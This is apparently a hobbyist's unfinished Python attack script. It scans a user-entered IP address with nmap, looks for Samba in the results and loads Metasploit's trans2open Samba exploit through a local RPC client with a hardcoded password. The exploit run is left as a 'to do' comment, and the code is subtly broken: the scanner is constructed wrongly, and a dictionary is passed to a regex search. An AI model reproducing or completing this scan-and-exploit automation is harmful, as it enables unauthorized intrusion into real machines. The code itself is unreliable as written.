#!/bin/python
import nmap
from pymetasploit3 import msfrpc
import os
import pyfiglet
import re

client = msfrpc.MsfRpcClient('mypasswd', port=555, ssl=False)

author = "### Author: hacks-and-codes ###"

print(pyfiglet.figlet_format(author, "starwars").format())

samba_search = "^(samba)|(smb)|(port 139)"
regex = "^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"


def check():
    try:
        global ip_address
        global data
        ip_address = (input('Enter ip: '))
        if (re.search(regex, ip_address)):
            data = nmap.PortScanner(ip_address)
            data.scan(ip_address, '-p-', '-A -T4', True)
        else:
            print("Invalid ip address")
    except Exception:
        print("An error has occured!\nPlease check your network")


def action():
    smb = data.scaninfo()
    if (re.search(samba_search, smb)):
        print("Samba found!")
        exploit = client.modules.use('exploit', 'exploit/linux x86/trans2open')
# To do
# excution and exploit for sessions to show up
# can only be done in linux
# I will continue in kali linux
    else:
        print("not smb found!")


check()
